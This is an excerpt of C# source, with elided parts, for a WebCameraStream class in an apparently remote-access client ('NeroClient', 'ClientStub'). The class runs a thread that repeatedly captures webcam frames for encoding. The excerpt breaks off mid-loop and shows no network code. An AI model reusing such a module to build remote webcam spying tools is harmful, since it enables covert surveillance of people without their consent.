...
using NeroClient.Helpers.Services.StreamLibrary;
using NeroClient.Helpers.Services.StreamLibrary.UnsafeCodecs;
...
namespace NeroClient.Helpers.Services
{
    ...
    public static class WebCameraStream
    {
        private static Thread WebCameraThread = new Thread(StartWebCamera);
        public static bool WebCameraActive { get; set; }
        ...
        public static void Start()
        {
            if (!WebCameraActive)
            {
                WebCameraActive = true;
                try
                {
                    WebCameraThread.SetApartmentState(ApartmentState.STA);
        ...
        public static void Stop()
        {
            if (WebCameraActive)
            {
                ...
                try
                {
                    WebCameraThread.Abort();
                    WebCameraThread = new Thread(StartWebCamera);
                }
                catch { }
            }
        }
        ...
        private static void StartWebCamera()
        {
            try
            {
                while (WebCameraActive)
                {
                    byte[] ImageBytes = null;
                    IUnsafeCodec UC = new UnsafeStreamCodec(50);

                    Bitmap Image = ClientStub.Helpers.Services.WebCamera.Camera.ccWebCam.CaptureBitmap();
                    Rectangle Rect = new Rectangle(0, 0, Image.Width, Image.Height);
                    Size S = new Size(Image.Width, Image.Height);
                    BitmapData BD = Image.LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
